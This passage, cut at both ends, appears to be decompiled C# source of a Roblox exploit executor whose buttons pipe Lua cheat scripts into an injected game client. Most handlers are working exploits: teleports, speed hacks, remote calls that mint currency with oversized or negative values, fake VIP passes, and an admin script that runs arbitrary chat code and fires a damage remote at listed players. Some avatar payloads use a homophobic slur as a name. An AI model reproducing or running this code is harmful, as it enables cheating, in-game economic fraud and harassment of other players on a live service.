32)\nPlace5.Font = Enum.Font.SourceSans\nPlace5.Text = 'Place [5]'\nPlace5.TextColor3 = Color3.new(1, 1, 1)\nPlace5.TextSize = 14\nPlace5.MouseButton1Down:connect(function()\ngame.Players.LocalPlayer.Character:MoveTo(Vector3.new(-1534.46313, -33.038002, 887.088318))\nend)\n\nStore.Name = 'Store'\nStore.Parent = Main\nStore.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)\nStore.BorderColor3 = Color3.new(1, 1, 1)\nStore.Position = UDim2.new(0.0581395365, 0, 0.606606603, 0)\nStore.Size = UDim2.new(0, 151, 0, 32)\nStore.Font = Enum.Font.SourceSans\nStore.Text = 'Store'\nStore.TextColor3 = Color3.new(1, 1, 1)\nStore.TextSize = 14\nStore.MouseButton1Down:connect(function()\ngame.Players.LocalPlayer.Character:MoveTo(Vector3.new(719.225952, -33.6261177, 894.049072))\nend)\n\nSpawn.Name = 'Spawn'\nSpawn.Parent = Main\nSpawn.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)\nSpawn.BorderColor3 = Color3.new(1, 1, 1)\nSpawn.Position = UDim2.new(0.0581395365, 0, 0.720720708, 0)\nSpawn.Size = UDim2.new(0, 151, 0, 32)\nSpawn.Font = Enum.Font.SourceSans\nSpawn.Text = 'Spawn'\nSpawn.TextColor3 = Color3.new(1, 1, 1)\nSpawn.TextSize = 14\nSpawn.MouseButton1Down:connect(function()\ngame.Players.LocalPlayer.Character:MoveTo(Vector3.new(536.137939, -36.409977, 886.542542))\nend)\n\nCredits.Name = 'Credits'\nCredits.Parent = Main\nCredits.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nCredits.BorderColor3 = Color3.new(1, 1, 1)\nCredits.BorderSizePixel = 0\nCredits.Position = UDim2.new(0, 0, 0.867867887, 0)\nCredits.Size = UDim2.new(0, 172, 0, 35)\nCredits.Font = Enum.Font.SciFi\nCredits.Text = 'By cloud#7697'\nCredits.TextColor3 = Color3.new(1, 1, 1)\nCredits.TextSize = 14\nCredits.MouseButton1Down:connect(function()\nMain.Visible = false\nend)");
    }

    private void flatButton281_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local WhileLoop = false;\nlocal PetId \t= 'A';\nlocal AutoIndex = 1; \n--// AutoIndex:  \n--// AutoIndex: Change it if you want to use a better pet\n--// PetId: Options [ A=Auto P=PRINT or type ur pet's id]\n\n--// Script's Variables\nlocal LocalPlayer\t = game:GetService'Players'.LocalPlayer;\nlocal GET_DIRECTORY  = function(str) return workspace:FindFirstChild('__' .. str:upper()) end;\nlocal REMOTES_FOLDER = GET_DIRECTORY('REMOTES');\nlocal THINGS_FOLDER\t = GET_DIRECTORY('THINGS');\nlocal PETS_FOLDER\t = GET_DIRECTORY('DEBRIS')['PETS'][LocalPlayer.Name];\nlocal COIN_FOLDER \t = THINGS_FOLDER ['Coins']\n\n--// Main Functions\nlocal function CLASSIFY_PET()\n\tlocal STRING_PET_ID = tostring(PetId);\n\tif STRING_PET_ID == 'A' then\n\t\tPetId = PETS_FOLDER:GetChildren''[tonumber(ifAutoUse) or 1].Name;\n\t\t\n\telseif STRING_PET_ID == 'P' then\n\t\tprint('INDEX', 'NAME', 'PATH');\n\t\tfor i, v in next, PETS_FOLDER:GetChildren'' do\n\t\t\tprint(i, v.Name, v:GetFullName'')\n\t\tend;\n\t\terror('Just printing your pets!');\n\telse\n\t\tPetId = PETS_FOLDER[PetId].Name;\n\tend;\n\tPetId = tonumber(PetId);\nend;\n\nlocal function Mine(Coin)\n\tlocal this  = {};\n\tthis.Mined  = 0;\n\t\n\tlocal COIN_REMOTE = REMOTES_FOLDER['Coins'];\n\t--// ARGUMENTS: CoinsRemote:FireServer(STRING_ACTION, STRING_COIN_NAME, NUMBER_VALUE, PLR_PET_ID)\n\t\n\tfor i, v in next, COIN_FOLDER:GetChildren'' do\n\t\twait();\n\t\tlocal HEALTH_VALUE = v:FindFirstChild'Health';\n\t\tif  HEALTH_VALUE then\n\t\t\tCOIN_REMOTE:FireServer('Mine', v.Name, HEALTH_VALUE.Value, PetId);\n\t\t\tthis.Mined = this.Mined+1;\n\t\t\t\n\t\tend;\n\tend;\n\t\n\treturn this;\nend;\n\n\nprint('Config:')\nprint(' PetId_Mode : ' .. PetId);\nprint(' AutoIndex  : ' .. AutoIndex);\nprint(' WhileLoop? : ' .. WhileLoop);\n\nCLASSIFY_PET();\nif WhileLoop then\n\tprint('Using While Loop!');\n\twhile wait() do\n\t\tMine();\n\tend;\nelse\n\tprint('Using DescendantAddedEvent!');\n\tTHINGS_FOLDER.DescendantAdded:Connect(function(Child)\n\t\tif Child.Parent:FindFirstChild'Health' then\n\t\t\tREMOTES_FOLDER['Coins']:FireServer('Mine', Child.Parent.Name, Child.Parent.Health.Value, PetId);\n\t\t\t\n\t\telseif Child:FindFirstChild'Health' then\n\t\t\tREMOTES_FOLDER['Coins']:FireServer('Mine', Child.Name, Child.Health.Value, PetId);\n\t\tend;\n\tend);\nend;\n\nprint('yAy, You didn't use WhileLoop!');\nwarn('Im gonna print some stuff right now!');\ntable.foreach(REMOTES_FOLDER, function(i, v ) print('[REMOTES][' .. i .. ']', v.Name, v.ClassName);end);\ntable.foreach(THINGS_FOLDER, function(i, v )  print('[THINGS]['.. i .. ']', v.Name, v.ClassName);end);\n\n\n ");
    }

    private void flatButton282_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').Name = 'Players' game.Players.LocalPlayer.leaderstats.Coins.Value = 999999999");
    }

    private void flatButton284_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Events.TycoonItems.PurchaseGemItem:InvokeServer(-100000000, 'G12')");
    }

    private void flatButton285_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 100 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton286_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("getglobal game\ngetfield -1 GetService\npushvalue -2\npushstring Lighting\npcall 2 1 0\npushstring 00:00:00\nsetfield -2 TimeOfDay\nemptystack");
    }

    private void flatButton287_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 100 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton288_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Events.GiveCR:FireServer(1000000)");
    }

    private void flatButton289_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Events.GivePTS:FireServer(1000000)");
    }

    private void flatButton291_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 100 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton292_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("AnimationId = '248263260'\nlocal Anim = Instance.new('Animation')\nAnim.AnimationId = 'rbxassetid://'..AnimationId\nlocal k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)\nk:Play()\nk:AdjustSpeed(1)");
    }

    private void flatButton290_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local gPlayers = game:GetService('Players') \nlocal admin       = gPlayers.LocalPlayer.Name \nlocal bannedplyrs = {'PeopleYouHate','MorePeopleYouHate'}\n\nlocal admins = {'Friend, Friend'} -- names here of people who have access to your commands! (Future Feature?)\n\n-- declare services / init stuff --\n\nlocal services={}\nlocal cmds={}\nlocal std={}\n\nlocal serverLocked = false\n\nfunction FIX_LIGHTING()\ngame.Lighting.Ambient = Color3.new(0.5, 0.5, 0.5)\ngame.Lighting.Brightness = 1\ngame.Lighting.GlobalShadows = true\ngame.Lighting.Outlines = false\ngame.Lighting.TimeOfDay = 14\ngame.Lighting.FogEnd = 100000\nend\n\nservices.players=gPlayers\nservices.lighting=game:GetService('Lighting')\nservices.workspace=game:GetService('Workspace')\nservices.events = {}\nlocal user = gPlayers.LocalPlayer\n\nlocal cmdprefix    = ';'\nlocal scriptprefix = '/'\nlocal split        = ' '\n\n\nupdateevents=function()\nfor i,v in pairs(services.events) do services.events:remove(i) v:disconnect() end\nfor i,v in pairs(gPlayers:players())do\nlocal ev = v.Chatted:connect(function(msg) do_exec(msg,v) end)\nservices.events[#services.events+1] = ev\nend\nend\n\nstd.inTable=function(tbl,val)\nif tbl==nil then return false end\n\nfor _,v in pairs(tbl)do\nif v==val then return true end\nend \nreturn false\nend\n\nstd.out=function(str)\nprint(str)\nend\n\nstd.list=function(tbl) --turns table into list with commas\nlocal str=''\nfor i,v in pairs(tbl)do\nstr=str..tostring(v)\nif i~=#tbl then str=str..', ' end\nend \nreturn str\nend\n\nstd.endat=function(str,val)\nlocal z=str:find(val)\nif z then \nreturn str:sub(0,z-string.len(val)),true\nelse \nreturn str,false \nend\nend\n\nstd.first=function(str) return str:sub(1,1) end\n\nisAdmin=function(name)\nif name==admin then\nreturn true\nelseif admins[name]==true then\nreturn true\nend\nreturn false\nend\n\ngPlayers.PlayerAdded:connect(function(player)\nfor i,v in pairs(bannedplyrs) do\ngame.ReplicatedStorage.Event:FireServer('TPD', 2000, gPlayers[v].Character.Humanoid)\nend\nend)\n\nlocal exec=function(str)\nspawn(function()\nlocal script, loaderr = loadstring(str)\nif not script then\nerror(loaderr)\nelse\nscript()\nend\nend)\nend\n\nlocal findCmd=function(cmd_name)\nfor i,v in pairs(cmds)do\nif v.NAME:lower()==cmd_name:lower() or std.inTable(v.ALIAS,cmd_name:lower())then\nreturn v\nend\nend\nend\n\nlocal getCmd=function(msg)\nlocal cmd,hassplit=std.endat(msg:lower(),split)\nif hassplit then \nreturn {cmd,true} \nelse \nreturn {cmd,false}\nend\nend\n\nlocal getprfx=function(strn)\nif strn:sub(1,string.len(cmdprefix))==cmdprefix then return{'cmd',string.len(cmdprefix)+1}\nelseif strn:sub(1,string.len(scriptprefix))==scriptprefix then return{'exec',string.len(scriptprefix)+1}\nend return\nend\n\nlocal getArgs=function(str)\nlocal args={}\nlocal new_arg=nil\nlocal hassplit=nil\nlocal s=str\nrepeat\nnew_arg,hassplit=std.endat(s:lower(),split)\nif new_arg~='' then\nargs[#args+1]=new_arg\ns=s:sub(string.len(new_arg)+string.len(split)+1)\nend\nuntil hassplit==false\nreturn args\nend\n\nlocal function execCmd(str, plr)\nlocal s_cmd\nlocal a\nlocal cmd\ns_cmd = getCmd(str) --separate command from string using split {command name,arg bool (for arg system)}\ncmd = findCmd(s_cmd[1]) --get command object {NAME,DESC,{ALIASES},function(args)}\nif cmd == nil then return end\na = str:sub(string.len(s_cmd[1]) + string.len(split) + 1)--start string 'a' after command and split\nlocal args=getArgs(a)--gets us a nice table of arguments\n\npcall(function()\ncmd.FUNC(args, plr)\nend)\nend\n\nfunction do_exec(str,plr)\nif not isAdmin(plr.Name)then return end \n\nstr=str:gsub('/e ','')--remove '/e ' the easy way!\n\nlocal t=getprfx(str)\nif t==nil then return end\nstr=str:sub(t[2])\nif t[1]=='exec' then\nexec(str)\nelseif t[1]=='cmd' then\nexecCmd(str, plr)\nend\nend\n\nupdateevents()\n_G.exec_cmd = execCmd\n--game.Players.LocalPlayer.Chatted:connect(doexec)\n\nlocal _char=function(plr_name)\nfor i,v in pairs(game.Players:GetChildren())do\nif v:IsA'Player'then\nif v.Name==plr_name then return v.Character end\nend\nend\nreturn\nend\n\nlocal _plr=function(plr_name)\nfor i,v in pairs(game.Players:GetChildren())do\nif v:IsA'Player'then\nif v.Name==plr_name then return v end\nend\nend\nreturn\nend\n\nfunction addcmd(name,desc,alias,func)\ncmds[#cmds+1]=\n{\nNAME=name;\nDESC=desc;\nALIAS=alias;\nFUNC=func;\n}\nend\n\nlocal function getPlayer(name)\nlocal nameTable = {}\nname=name:lower()\nif name == 'me' then\nreturn {admin}\nelseif name == 'others' then\nfor i,v in pairs(gPlayers:GetChildren()) do\nif v:IsA'Player'then\nif v.Name~=admin then\nnameTable[#nameTable+1]=v.Name\nend\nend\nend\nelseif name == 'all' then\nfor i,v in pairs(gPlayers:GetChildren()) do\nif v:IsA'Player'then \nnameTable[#nameTable+1]=v.Name\nend\nend\nelse\nfor i,v in pairs(gPlayers:GetChildren()) do\nlocal lname = v.Name:lower()\nlocal i,j = lname:find(name)\nif i == 1 then\nreturn {v.Name}\nend\nend\nend\nreturn nameTable\nend\n\n-- commands --\n\naddcmd('Vip','Gives u VIP',nil,\nfunction(args)\nname = game:GetService('Players').LocalPlayer.Name\nlocal PATH = game:GetService('ReplicatedStorage').PlayerData[name].CachedPasses\n\nlocal Folder1 = Instance.new('Folder')\nFolder1.Parent = PATH\nFolder1.Name = '1056689214'\n\nlocal Folder2 = Instance.new('Folder')\nFolder2.Parent = PATH\nFolder2.Name = '449630072'\n\nlocal Folder3 = Instance.new('Folder')\nFolder3.Parent = PATH\nFolder3.Name = '451671148'\n\nlocal Folder4 = Instance.new('Folder')\nFolder4.Parent = PATH\nFolder4.Name = '629102188'\n\nlocal Folder5 = Instance.new('Folder')\nFolder5.Parent = PATH\nFolder5.Name = '748170248'\n\nlocal Folder6 = Instance.new('Folder')\nFolder6.Parent = PATH\nFolder6.Name = '752909285'\n\nlocal Folder7 = Instance.new('Folder')\nFolder7.Parent = PATH\nFolder7.Name = '790960993'\n\nlocal Folder8 = Instance.new('Folder')\nFolder8.Parent = PATH\nFolder8.Name = '859238750'\n\nlocal Folder9 = Instance.new('Folder')\nFolder9.Parent = PATH\nFolder9.Name = '449630210'\n\nlocal Folder10 = Instance.new('Folder')\nFolder10.Parent = PATH\nFolder10.Name = '1404986936'\nend)\n\naddcmd('Meme','HMPH',nil,\nfunction(args)\n--Made by N3xul.\nlocal weird =\n{\n['assets'] =\n{\n[1] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 616980142,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[2] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 602599987,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[3] =\n{\n['drotation'] =\n{\n['y'] = 180,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 100,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 244159819,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[4] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 7075502,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[5] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 916733101,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n}\n},\n['description'] = '',\n['createdDate'] = 1000,\n['lowerDesc'] = '',\n['bodyColors'] =\n{\n['HeadColor'] = Color3.new(1, 0, 0),\n['TorsoColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['LeftArmColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['RightLegColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['RightArmColor'] = Color3.new(1, 0, 0),\n['LeftLegColor'] = Color3.new(1, 0, 0)\n},\n['scales'] =\n{\n['LowerLegHeight'] = 5,\n['UpperTorsoWidth'] = 5,\n['UpperArmHeight'] = 5,\n['HandHeight'] = 5,\n['UpperLegWidth'] = -1,\n['LowerArmWidth'] = -1,\n['FootWidth'] = 5,\n['LowerArmHeight'] = -1,\n['UpperArmWidth'] = -1,\n['FootHeight'] = 5,\n['LowerTorsoWidth'] = -1,\n['UpperTorsoHeight'] = -1,\n['HandWidth'] = -1,\n['HeadScale'] = -1,\n['UpperLegHeight'] = -1,\n['LowerTorsoHeight'] = -1,\n['LowerLegWidth'] = -1\n},\n['name'] = '',\n['outfitId'] = 1,\n['isOutfit'] = true,\n['collageSeed'] = 0,\n['lowerName'] = ''\n}\nlocal Event = game:GetService('ReplicatedStorage').AvatarEditor.Remote.CommitCharacterAppearance\nEvent:FireServer(weird)\nend)\n\naddcmd('Jeff','Makes sound SMH',nil,\nfunction(args)\nlocal remote = Game['ReplicatedStorage']['ClientRequests']['Music']['PlayRadioSong']\nlocal args = {\n[1] = '333637668'\n}\nremote:InvokeServer(unpack(args))\nend)\n\naddcmd('Pawnshop','Pawned NOOB',nil,\nfunction(args)\nlocal remote = Game['ReplicatedStorage']['ClientRequests']['Music']['PlayRadioSong']\nlocal args = {\n[1] = '482683318'\n}\nremote:InvokeServer(unpack(args))\nend)\n\naddcmd('Bighead','BOOM your dead',nil,\nfunction(args)\n--Brought to you by N3xul.\nlocal OOF =\n{\n['assets'] =\n{\n[1] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 10000,\n['x'] = 10000,\n['z'] = 10000\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 916733101,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[2] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 20000,\n['x'] = 20000,\n['z'] = 20000\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 602599987,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[3] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 10000,\n['x'] = 10000,\n['z'] = 10000\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 616980142,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[4] =\n{\n['drotation'] =\n{\n['y'] = 180,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 100,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 1250,\n['x'] = 1250,\n['z'] = 12500\n},\n['dscale'] =\n{\n['y'] = 750,\n['x'] = 750,\n['z'] = 750\n},\n['vscale'] =\n{\n['y'] = 1.25,\n['x'] = 1.25,\n['z'] = 1.25\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 244159819,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[5] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 5000,\n['x'] = 5000,\n['z'] = 5000\n},\n['dscale'] =\n{\n['y'] = 5000,\n['x'] = 5000,\n['z'] = 5000\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 7075502,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n}\n},\n['description'] = '',\n['createdDate'] = 1000,\n['lowerDesc'] = '',\n['bodyColors'] =\n{\n['HeadColor'] = Color3.new(1, 0, 0),\n['TorsoColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['LeftArmColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['RightLegColor'] = Color3.new(0.0666667, 0.0666667, 0.0666667),\n['RightArmColor'] = Color3.new(1, 0, 0),\n['LeftLegColor'] = Color3.new(1, 0, 0)\n},\n['scales'] =\n{\n['LowerLegHeight'] = 1,\n['UpperTorsoWidth'] = 1,\n['UpperArmHeight'] = 1,\n['HandHeight'] = 1,\n['UpperLegWidth'] = 1,\n['LowerArmWidth'] = 1,\n['FootWidth'] = 1,\n['LowerArmHeight'] = 1,\n['UpperArmWidth'] = 1,\n['FootHeight'] = 1,\n['LowerTorsoWidth'] = 1,\n['UpperTorsoHeight'] = 1,\n['HandWidth'] = 1,\n['HeadScale'] = 500,\n['UpperLegHeight'] = 1,\n['LowerTorsoHeight'] = 1,\n['LowerLegWidth'] = 1\n},\n['name'] = 'GAY',\n['outfitId'] = 1,\n['isOutfit'] = true,\n['collageSeed'] = 0,\n['lowerName'] = ''\n}\nlocal Event = game:GetService('ReplicatedStorage').AvatarEditor.Remote.CommitCharacterAppearance\nEvent:FireServer(OOF)\nend)\n\naddcmd('ws','change a players walkspeed',{},\n function(args)\n     -- << K1LL0X >> --\n\n--This may be a little buggy, so beware.\n--Hold 'Q' to speed up\n\n\n\n\n\n\ndown = false\nvelocity = Instance.new('BodyVelocity')\nvelocity.maxForce = Vector3.new(100000, 0, 100000)\n---vv Use that to change the speed v\nlocal speed = 150\ngyro = Instance.new('BodyGyro')\ngyro.maxTorque = Vector3.new(100000, 0, 100000)\n\nlocal hum = game.Players.LocalPlayer.Character.Humanoid\n\nfunction onButton1Down(mouse)\ndown = true\nvelocity.Parent = game.Players.LocalPlayer.Character.UpperTorso\nvelocity.velocity = (hum.MoveDirection) * speed\ngyro.Parent = game.Players.LocalPlayer.Character.UpperTorso\nwhile down do\nif not down then break end\nvelocity.velocity = (hum.MoveDirection) * speed\nlocal refpos = gyro.Parent.Position + (gyro.Parent.Position - workspace.CurrentCamera.CoordinateFrame.p).unit * 5\ngyro.cframe = CFrame.new(gyro.Parent.Position, Vector3.new(refpos.x, gyro.Parent.Position.y, refpos.z))\nwait(0.1)\nend\nend\n\nfunction onButton1Up(mouse)\nvelocity.Parent = nil\ngyro.Parent = nil\ndown = false\nend\n--To Change the key in those 2 lines, replace the 'q' with your desired key\nfunction onSelected(mouse)\nmouse.KeyDown:connect(function(k) if k:lower()=='q'then onButton1Down(mouse)end end)\nmouse.KeyUp:connect(function(k) if k:lower()=='q'then onButton1Up(mouse)end end)\nend\n\nonSelected(game.Players.LocalPlayer:GetMouse())\n end)\n\naddcmd('clicktp','Your GOD',{},\n function(args)\n     player1=game.Players.LocalPlayer\n\nq=Instance.new('HopperBin', player1.Backpack)\nq.Name = 'Click Teleport'\n\n\nbin = q\n\n\n\nfunction teleportPlayer(pos)\nlocal player = game.Players.LocalPlayer\nif player == nil or player.Character == nil then return end\nplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x, pos.y + 7, pos.z))\nend\n\n\nenabled = true\nfunction onButton1Down(mouse)\nif not enabled then\nreturn\nend\n\nlocal player = game.Players.LocalPlayer\nif player == nil then return end\n\n\nenabled = false\nlocal cf = mouse.Hit\nlocal v = cf.lookVector\n\nteleportPlayer(cf.p)\n\nwait()\nenabled = true\n\nend\n\nfunction onSelected(mouse)\nmouse.Icon = 'rbxasset://textures\\ArrowCursor.png'\nmouse.Button1Down:connect(function() onButton1Down(mouse) end)\nend\n\nbin.Selected:connect(onSelected)\nend)\n\n\n   addcmd('titan','Sie sind das Essen und Wir sind die Jaeger!',nil,\n   function(args)\n  --Made by N3xul.\nlocal titan 